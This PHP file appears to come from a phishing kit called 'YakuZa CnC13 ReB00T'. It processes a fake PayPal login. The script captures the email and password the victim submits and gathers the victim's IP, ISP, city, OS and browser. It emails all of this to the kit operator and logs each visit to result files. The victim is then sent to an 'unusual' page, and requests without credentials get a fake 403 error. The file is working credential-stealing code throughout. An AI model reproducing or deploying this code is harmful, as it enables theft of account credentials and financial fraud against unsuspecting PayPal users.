<?php
//error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';

if (!isset($_POST['login_email']) || $_POST['login_email'] == ''){
tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}
if (!isset($_POST['login_password']) || $_POST['login_password'] == ''){
tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}

$_SESSION['login_email'] = $_POST['login_email'];
$_SESSION['login_password'] = $_POST['login_password'];
$ip = getUserIP();
$message = "#-------------------------[💎 YakuZa CnC13 ReB00T 💎]------------------#\n";
$message .= "#----------------------------[🍟 PAYPAL LOGIN 🍟]----------------------#\n";
$message .= "🍟 Email           : ".$_SESSION['login_email']."\n";
$message .= "🍟 Mot de passe    : ".$_SESSION['login_password']."\n";
$message .= "#---------------------------[💉 PC INFORMATION 💉]---------------------#\n";
$message .= "💉 Date            : ".$date."\n";
$message .= "💉 IP              : ".$ip."\n";
$message .= "💉 FAI             : ".$ispuser."\n";
//$message .= "💉 Region        : ".$regioncity."\n";
$message .= "💉 Ville           : ".$citykota."\n";
//$message .= "💉 Continent     : ".$continent."\n";
//$message .= "💉 Timezone      : ".$timezone."\n";
$message .= "💉 OS/Browser      : ".$os." / ".$br."\n";
$message .= "💉 User Agent      : ".$user_agent."\n\n";
//$message .= "#-------------------------[💎 YakuZa CnC13 ReB00T 💎]------------------#\n";


$subject = "[PP LOGIN] $ip | " . "$citykota | $cn |" . $_SESSION['login_email'];

if($send_login == "on") {
kirim_mail($email_recipient, $_SESSION['login_email'], $subject, $message);
}

tulis_file("../result/total_login.txt", "[$date] $ip | $cn | $br | $os");
tulis_file("../result/log_visitor.txt", "[$date] $ip | $cn | $br | $os");

echo "<script type='text/javascript'>window.top.location='unusual?key=$key';</script>";
?>